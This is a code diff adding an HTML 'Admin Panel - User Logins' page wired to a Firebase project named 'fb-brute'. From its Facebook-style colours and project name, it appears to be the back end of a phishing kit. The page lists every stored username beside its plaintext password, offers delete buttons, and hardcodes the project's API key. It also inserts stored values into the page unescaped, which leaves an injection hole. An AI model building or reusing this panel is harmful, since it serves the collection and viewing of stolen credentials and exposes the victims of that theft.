@@ -1,1 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            text-align: center;
+            padding: 20px;
+        }
+        h2 {
+            color: #1877f2;
+        }
+        table {
+            width: 100%;
+            max-width: 600px;
+            margin: 20px auto;
+            border-collapse: collapse;
+            background: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        th {
+            background-color: #1877f2;
+            color: white;
+        }
+        button {
+            background-color: #f44336;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #e53935;
+        }
+    </style>
+</head>
+<body>
 
+    <h2>Admin Panel - User Logins</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Action</th> <!-- Add Action column for delete button -->
+            </tr>
+        </thead>
+        <tbody id="user-data">
+            <!-- User data dynamically added here -->
+        </tbody>
+    </table>
+
+    <!-- Firebase Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAGHeUptqSPwdU29woiiVoiwifb9GykS4k",
+            authDomain: "fb-brute.firebaseapp.com",
+            databaseURL: "https://fb-brute-default-rtdb.firebaseio.com",
+            projectId: "fb-brute",
+            storageBucket: "fb-brute.appspot.com",
+            messagingSenderId: "309698369375",
+            appId: "1:309698369375:web:a43fa9dd42e0b3cf7ac8ea",
+            measurementId: "G-30ERCV6NXQ"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Fetch users from Firebase
+        function fetchUsers() {
+            const userData = document.getElementById("user-data");
+            database.ref("users").on("value", (snapshot) => {
+                userData.innerHTML = ""; // Clear table before updating
+                snapshot.forEach((childSnapshot) => {
+                    const data = childSnapshot.val();
+                    const userId = childSnapshot.key; // Get user ID to delete specific user
+                    const row = `<tr>
+                                    <td>${data.username}</td> 
+                                    <td>${data.password}</td>
+                                    <td><button onclick="deleteUser('${userId}')">Delete</button></td> <!-- Delete button -->
+                                </tr>`;
+                    userData.innerHTML += row;
+                });
+            });
+        }
+
+        // Function to delete user
+        function deleteUser(userId) {
+            const confirmation = confirm("Are you sure you want to delete this user?");
+            if (confirmation) {
+                database.ref("users/" + userId).remove()
+                    .then(() => {
+                        alert("User deleted successfully!");
+                        fetchUsers(); // Refresh the table after deletion
+                    })
+                    .catch((error) => {
+                        alert("Error deleting user: " + error.message);
+                    });
+            }
+        }
+
+        fetchUsers();
+    </script>
+
+</body>
+  </html>
